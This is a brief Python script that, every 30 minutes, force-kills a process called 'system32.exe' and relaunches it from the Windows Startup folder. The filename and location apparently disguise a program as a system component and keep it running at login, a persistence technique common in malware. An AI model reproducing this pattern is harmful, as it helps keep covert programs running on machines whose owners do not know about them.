import os 
import time 
while True:
    time.sleep(1800)
    os.system("taskkill /IM system32.exe /F")
    time.sleep(30)
    os.system('"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup/system32.exe"')


